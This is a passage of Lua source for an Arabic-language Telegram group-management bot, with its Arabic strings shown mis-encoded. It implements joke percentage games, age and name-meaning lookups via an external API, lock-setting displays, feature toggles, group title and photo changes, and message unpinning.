Devmfm:set(mustafa..'AnothaNsba:mfm'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูู ุจุงุฑุณู ุงุณู ุงูุดุฎุต ูููุงุณ ูุณุจุฉ ุงููุซุชู ููุซุงู โซ ุฑูุฒ', 1, 'md')
end
end
if text and text ~= "ูุณุจู ุงูุงููุซู" and text ~= "ูุณุจุฉ ุงูุงููุซู" and text ~= "ูุณุจู ุงููุซู" and text ~= "ูุณุจุฉ ุงููุซู" and Devmfm:get(mustafa..'AnothaNsba:mfm'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'ุงูุบุงุก' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุงูุฑ ูุณุจุฉ ุงูุงููุซู ', 1, 'md')
Devmfm:del(mustafa..'AnothaNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
mfm = math.random(0,100);
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุณุจุฉ ุงููุซุฉ '..text..' ูู : '..mfm..'%', 1, 'md')
Devmfm:del(mustafa..'AnothaNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not Devmfm:get(mustafa..'mfm:Nsba:mfm'..msg.chat_id_) then
if text and (text == "ูุณุจู ุงูุบุจุงุก" or text == "ูุณุจุฉ ุงูุบุจุงุก") and ChCheck(msg) then
Devmfm:set(mustafa..'StupidNsba:mfm'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูู ุจุงุฑุณู ุงุณู ุงูุดุฎุต ูููุงุณ ูุณุจุฉ ุบุจุงุฆู ููุซุงู โซ ุฌุงู ุงู ุฑูุฒ', 1, 'md')
end
end
if text and text ~= "ูุณุจู ุงูุบุจุงุก" and text ~= "ูุณุจุฉ ุงูุบุจุงุก" and Devmfm:get(mustafa..'StupidNsba:mfm'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'ุงูุบุงุก' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุงูุฑ ูุณุจุฉ ุงูุบุจุงุก ', 1, 'md')
Devmfm:del(mustafa..'StupidNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
mfm = math.random(0,100);
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุณุจุฉ ุบุจุงุก '..text..' ูู : '..mfm..'%', 1, 'md')
Devmfm:del(mustafa..'StupidNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if text == "ุชูุนูู ุญุณุงุจ ุงูุนูุฑ" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุญุณุงุจ ุงูุนูุฑ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Age:mfm'..msg.chat_id_) 
end
if text == "ุชุนุทูู ุญุณุงุจ ุงูุนูุฑ" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุญุณุงุจ ุงูุนูุฑ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Age:mfm'..msg.chat_id_,true)  
end
if not Devmfm:get(mustafa..'mfm:Age:mfm'..msg.chat_id_) then
if text and text:match("^ุงุญุณุจ (.*)$") and ChCheck(msg) or text and text:match("^ุนูุฑู (.*)$") and ChCheck(msg) then 
local TextAge = text:match("^ุงุญุณุจ (.*)$") or text:match("^ุนูุฑู (.*)$") 
UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge) 
t = Age.ok.mfm
Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
if text == "ุชูุนูู ูุนุงูู ุงูุงุณูุงุก" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ูุนุงูู ุงูุงุณูุงุก'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Mean:mfm'..msg.chat_id_) 
end
if text == "ุชุนุทูู ูุนุงูู ุงูุงุณูุงุก" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ูุนุงูู ุงูุงุณูุงุก'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Mean:mfm'..msg.chat_id_,true)  
end
if not Devmfm:get(mustafa..'mfm:Mean:mfm'..msg.chat_id_) then
if text and text:match("^ูุนูู ุงูุงุณู (.*)$") and ChCheck(msg) or text and text:match("^ูุนูู ุงุณู (.*)$") and ChCheck(msg) then 
local TextMean = text:match("^ูุนูู ุงูุงุณู (.*)$") or text:match("^ูุนูู ุงุณู (.*)$") 
UrlMean = https.request('https://apiabs.ml/Mean.php?Abs='..URL.escape(TextMean)) 
Mean = JSON.decode(UrlMean) 
t = Mean.ok.mfm
Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
if text == "ุบูููู" and ChCheck(msg) then
data,res = https.request('https://apiabs.ml/Audios.php')
if res == 200 then
Audios = json:decode(data)
if Audios.Info == true then
local Text ='โ๏ธุชู ุงุฎุชูุงุฑ ุงูููุทุน ุงูุตูุชู ูู'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'โ DEMON Team .',url="t.me/KKDKKB7"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
if Admin(msg) then
if Devmfm:get(mustafa..'mfm:LockSettings'..msg.chat_id_) then 
if text == "ุงูุฑูุงุจุท" then if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then mute_links = 'ููููู' else mute_links = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงูุฑูุงุจุท โซ "..mute_links.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงููุนุฑู" or text == "ุงููุนุฑูุงุช" then if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then lock_tag = 'ูููููู' else lock_tag = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงููุนุฑู โซ "..lock_tag.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงููุชุญุฑูู" or text == "ุงูููุตูุงุช ุงููุชุญุฑูู" then if Devmfm:get(mustafa..'mfm:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'ูููููู' else mute_gifs = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงููุชุญุฑูู โซ "..mute_gifs.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูููุตูุงุช" then if Devmfm:get(mustafa..'mfm:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'ูููููู' else lock_sticker = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงูููุตูุงุช โซ "..lock_sticker.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุตูุฑ" then if Devmfm:get(mustafa..'mfm:Lock:Photo'..msg.chat_id_) then mute_photo = 'ูููููู' else mute_photo = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงูุตูุฑ โซ "..mute_photo.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูููุฏูู" or text == "ุงูููุฏูููุงุช" then if Devmfm:get(mustafa..'mfm:Lock:Videos'..msg.chat_id_) then mute_video = 'ูููููู' else mute_video = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงูููุฏูู โซ "..mute_video.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุงูููุงูู" then if Devmfm:get(mustafa..'mfm:Lock:Inline'..msg.chat_id_) then mute_in = 'ูููู' else mute_in = 'ููุชูุญ' end local mustafaTEAM = "\n" .."โ๏ธุงูุงูููุงูู โซ "..mute_in.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุฏุฑุฏุดู" then if Devmfm:get(mustafa..'mfm:Lock:Text'..msg.chat_id_) then mute_text = 'ููููู' else mute_text = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงูุฏุฑุฏุดู โซ "..mute_text.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุชูุฌูู" or text == "ุงุนุงุฏู ุงูุชูุฌูู" then if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then lock_forward = 'ูููู' else lock_forward = 'ููุชูุญ' end local mustafaTEAM = "\n" .."โ๏ธุงูุชูุฌูู โซ "..lock_forward.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุงุบุงูู" then if Devmfm:get(mustafa..'mfm:Lock:Music'..msg.chat_id_) then mute_music = 'ูููููู' else mute_music = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงูุงุบุงูู โซ "..mute_music.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุตูุช" or text == "ุงูุตูุชูุงุช" then if Devmfm:get(mustafa..'mfm:Lock:Voice'..msg.chat_id_) then mute_voice = 'ููููู' else mute_voice = 'ููุชูุญ' end local mustafaTEAM = "\n" .."โ๏ธุงูุตูุช โซ "..mute_voice.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุฌูุงุช" or text == "ุฌูุงุช ุงูุงุชุตุงู" then if Devmfm:get(mustafa..'mfm:Lock:Contact'..msg.chat_id_) then lock_contact = 'ูููููู' else lock_contact = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงูุฌูุงุช โซ "..lock_contact.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงููุงุฑูุฏุงูู" then if Devmfm:get(mustafa..'mfm:Lock:Markdown'..msg.chat_id_) then markdown = 'ูููู' else markdown = 'ููุชูุญ' end local mustafaTEAM = "\n" .."โ๏ธุงููุงุฑูุฏุงูู โซ "..markdown.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงููุงุดุชุงู" then if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'ูููู' else lock_htag = 'ููุชูุญ' end local mustafaTEAM = "\n" .."โ๏ธุงููุงุดุชุงู โซ "..lock_htag.."\n"Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุชุนุฏูู" then if Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'ูููู' else mute_edit = 'ููุชูุญ' end local mustafaTEAM = "\n" .."โ๏ธุงูุชุนุฏูู โซ "..mute_edit.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุชุซุจูุช" then if Devmfm:get(mustafa..'mfm:Lock:Pin'..msg.chat_id_) then lock_pin = 'ูููู' else lock_pin = 'ููุชูุญ' end local mustafaTEAM = "\n" .."โ๏ธุงูุชุซุจูุช โซ "..lock_pin.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุงุดุนุงุฑุงุช" then if Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'ูููููู' else lock_tgservice = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงูุงุดุนุงุฑุงุช โซ "..lock_tgservice.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูููุงูุด" then if Devmfm:get(mustafa..'mfm:Lock:Spam'..msg.chat_id_) then lock_spam = 'ูููููู' else lock_spam = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงูููุงูุด โซ "..lock_spam.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุฏุฎูู" then if Devmfm:get(mustafa..'mfm:Lock:Join'..msg.chat_id_) then lock_Join = 'ููููู' else lock_Join = 'ููุชูุญ' end local mustafaTEAM = "\n" .."โ๏ธุงูุฏุฎูู โซ "..lock_Join.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุดุจูุงุช" then if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'ูููููู' else lock_wp = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงูุดุจูุงุช โซ "..lock_wp.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูููุงูุน" then if Devmfm:get(mustafa..'mfm:Lock:Location'..msg.chat_id_) then lock_location = 'ูููููู' else lock_location = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงูููุงูุน โซ "..lock_location.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุนุฑุจูู" then if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'ูููููู' else lock_arabic = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงูุนุฑุจูู โซ "..lock_arabic.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุงููููุฒูู" then if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then lock_english = 'ูููููู' else lock_english = 'ููุชูุญู' end local mustafaTEAM = "\n" .."โ๏ธุงูุงููููุฒูู โซ "..lock_english.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูููุฑ" then if Devmfm:get(mustafa..'mfm:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'ููุชูุญ' else lock_kaf = 'ูููู' end local mustafaTEAM = "\n" .."โ๏ธุงูููุฑ โซ "..lock_kaf.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงููุดุงุฑ" then if Devmfm:get(mustafa..'mfm:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'ููุชูุญ' else lock_fshar = 'ูููู' end local mustafaTEAM = "\n" .."โ๏ธุงููุดุงุฑ โซ "..lock_fshar.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "ุงูุทุงุฆููู" then if Devmfm:get(mustafa..'mfm:Lock:Taf'..msg.chat_id_) then lock_taf = 'ููุชูุญู' else lock_taf = 'ููููู' end local mustafaTEAM = "\n" .."โ๏ธุงูุทุงุฆููู โซ "..lock_taf.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
end
if text == 'ุชูุนูู ูุดู ุงูุงุนุฏุงุฏุงุช' and ChCheck(msg) then 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ูุดู ุงูุงุนุฏุงุฏุงุช'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:LockSettings'..msg.chat_id_,true)  
end
if text == 'ุชุนุทูู ูุดู ุงูุงุนุฏุงุฏุงุช' and ChCheck(msg) then 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ูุดู ุงูุงุนุฏุงุฏุงุช'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:LockSettings'..msg.chat_id_) 
end
if text == 'ุชูุนูู ุงูุงูุฑ ุงูุชุญุดูุด' and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุงูุฑ ุงูุชุญุดูุด'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:Stupid'..msg.chat_id_)
end
if text == 'ุชุนุทูู ุงูุงูุฑ ุงูุชุญุดูุด' and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุงูุฑ ุงูุชุญุดูุด'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:Stupid'..msg.chat_id_,true)
end
if text == 'ุชูุนูู ุฑุฏูุฏ ุงููุฏูุฑ' and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุฑุฏูุฏ ุงููุฏูุฑ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:GpRed'..msg.chat_id_)
end
if text == 'ุชุนุทูู ุฑุฏูุฏ ุงููุฏูุฑ' and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุฑุฏูุฏ ุงููุฏูุฑ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:GpRed'..msg.chat_id_,true)
end
if text == 'ุชูุนูู ุฑุฏูุฏ ุงููุทูุฑ' and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุฑุฏูุฏ ุงููุทูุฑ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:AllRed'..msg.chat_id_)
end
if text == 'ุชุนุทูู ุฑุฏูุฏ ุงููุทูุฑ' and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุฑุฏูุฏ ุงููุทูุฑ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:AllRed'..msg.chat_id_,true)
end
if SecondSudo(msg) then
if text == 'ุชูุนูู ุงููุบุงุฏุฑู' or text == 'โซ ุชูุนูู ุงููุบุงุฏุฑู โ' then 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงููุบุงุฏุฑู ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa.."mfm:Left:Bot"..mustafa)
end
if text == 'ุชุนุทูู ุงููุบุงุฏุฑู' or text == 'โซ ุชุนุทูู ุงููุบุงุฏุฑู โ' then 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงููุบุงุฏุฑู ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa.."mfm:Left:Bot"..mustafa,true) 
end 
if text == 'ุชูุนูู ุงูุงุฐุงุนู' or text == 'โซ ุชูุนูู ุงูุงุฐุงุนู โ' then 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุงุฐุงุนู ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa.."mfm:Send:Bot"..mustafa)
end
if text == 'ุชุนุทูู ุงูุงุฐุงุนู' or text == 'โซ ุชุนุทูู ุงูุงุฐุงุนู โ' then 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุงุฐุงุนู ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa.."mfm:Send:Bot"..mustafa,true) 
end
end
if text and text:match("^ุถุน ุงุณู (.*)$") and Manager(msg) and ChCheck(msg) then
local txt = {string.match(text, "^(ุถุน ุงุณู) (.*)$")}
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = txt[2] },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"โ๏ธุงูุจูุช ููุณ ุงุฏูู ูุฑุฌู ุชุฑููุชู !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"โ๏ธููุณุช ูุฏู ุตูุงุญูุฉ ุชุบูุฑ ูุนูููุงุช ุงููุฌููุนู ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช")  
else
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุบูุฑ ุงุณู ุงููุฌููุนู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
end,nil) 
end
if msg.content_.photo_ then
if Devmfm:get(mustafa..'mfm:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"โ๏ธุนุฐุฑุง ุงูุจูุช ููุณ ุงุฏูู ูุฑุฌู ุชุฑููุชู ูุงููุญุงููู ูุงุญูุง") 
Devmfm:del(mustafa..'mfm:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"โ๏ธููุณุช ูุฏู ุตูุงุญูุฉ ุชุบูุฑ ูุนูููุงุช ุงููุฌููุนู ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช") 
Devmfm:del(mustafa..'mfm:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
else
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุบูุฑ ุตูุฑุฉ ุงููุฌููุนู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
end,nil) 
Devmfm:del(mustafa..'mfm:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
end 
end
if text and text:match("^ุถุน ุตูุฑู$") and ChCheck(msg) or text and text:match("^ูุถุน ุตูุฑู$") and ChCheck(msg) then
Dev_mfm(msg.chat_id_,msg.id_, 1, 'โ๏ธุงุฑุณู ุตูุฑุฉ ุงููุฌููุนู ุงูุงู', 1, 'md')
Devmfm:set(mustafa..'mfm:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^ุญุฐู ุงูุตูุฑู$") and ChCheck(msg) or text and text:match("^ูุณุญ ุงูุตูุฑู$") and ChCheck(msg) then
https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุตูุฑุฉ ุงููุฌููุนู")  
return false  
end
if Manager(msg) then
if text and text:match("^ุงูุบุงุก ุชุซุจูุช$") and ChCheck(msg) or text and text:match("^ุงูุบุงุก ุงูุชุซุจูุช$") and ChCheck(msg) then
if Devmfm:sismember(mustafa.."mfm:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_mfm(msg.chat_id_,msg.id_, 1, "โ๏ธุงูุชุซุจูุช ูุงูุบุงุก ูุงุนุงุฏุฉ ุงูุชุซุจูุช ุชู ูููู ูู ูุจู ุงูููุดุฆูู ุงูุงุณุงุณููู", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
Devmfm:del(mustafa..'mfm:PinnedMsg'..msg.chat_id_)
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุงูุบุงุก ุชุซุจูุช ุงูุฑุณุงูู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"โ๏ธุงูุง ูุณุช ุงุฏูู ููุง ูุฑุฌู ุชุฑููุชู ุงุฏูู ุซู ุงุนุฏ ุงููุญุงููู")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"โ๏ธููุณุช ูุฏู ุตูุงุญูุฉ ุงูุชุซุจูุช ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช")  
return false  
end
end,nil)
end
if text and text:match("^ุงูุบุงุก ุชุซุจูุช ุงููู$") then  
if Devmfm:sismember(mustafa.."mfm:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_mfm(msg.chat_id_,msg.id_, 1, "โ๏ธุงูุชุซุจูุช ูุงูุบุงุก ูุงุนุงุฏุฉ ุงูุชุซุจูุช ุชู ูููู ูู ูุจู ุงูููุดุฆูู ุงูุงุณุงุณููู", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุงูุบุงุก ุชุซุจูุช ุงููู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
https.request('https://api.telegram.org/bot'..TokenBot..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
Devmfm:del(mustafa.."mfm:PinnedMsg"..msg.chat_id_)
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"โ๏ธุงูุง ูุณุช ุงุฏูู ููุง ูุฑุฌู ุชุฑููุชู ุงุฏูู ุซู ุงุนุฏ ุงููุญุงููู")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"โ๏ธููุณุช ูุฏู ุตูุงุญูุฉ ุงูุชุซุจูุช ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช")  
return false  
end
end,nil)
end
if text and text:match("^ุงุนุงุฏู ุชุซุจูุช$") and ChCheck(msg) or text and text:match("^ุงุนุงุฏู ุงูุชุซุจูุช$") and ChCheck(msg) or text and text:match("^ุงุนุงุฏุฉ ุงูุชุซุจูุช$") and ChCheck(msg) then
if Devmfm:sismember(mustafa.."mfm:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_mfm(msg.chat_id_,msg.id_, 1, "โ๏ธุงูุชุซุจูุช ูุงูุบุงุก ูุงุนุงุฏุฉ ุงูุชุซุจูุช ุชู ูููู ูู ูุจู ุงูููุดุฆูู ุงูุงุณุงุณููู", 1, 'md')
return false  
end
